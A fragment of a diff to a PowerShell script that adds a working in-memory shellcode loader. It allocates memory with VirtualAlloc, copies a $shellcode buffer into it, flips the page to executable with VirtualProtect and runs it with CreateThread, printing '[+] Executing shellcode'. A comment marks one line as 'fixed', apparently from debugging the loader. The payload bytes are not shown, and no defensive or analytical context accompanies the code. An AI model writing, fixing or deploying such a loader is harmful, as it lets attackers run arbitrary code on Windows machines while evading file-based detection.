@@ -38,3 +38,25 @@ try {
 } catch {
     Write-Host "[-] Execution error: $($_.Exception.Message)"
 }
+
+try {
+    $addr = [Native.Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)
+    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
+
+    [Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
+
+    $oldProtect = 0
+    $success = [Native.Win32]::VirtualProtect($addr, [uint32]$size, 0x20, [ref]$oldProtect)
+    if (-not $success) { throw "VirtualProtect failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
+
+    $tid = 0
+    $thread = [Native.Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
+    if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
+
+    Write-Host "[+] Executing shellcode"
+    [Native.Win32]::WaitForSingleObject($thread, [uint32]::MaxValue)   # ← fixed line
+
+    Write-Host "[+] Execution finished"
+} catch {
+    Write-Host "[-] Execution error: $($_.Exception.Message)"
+}
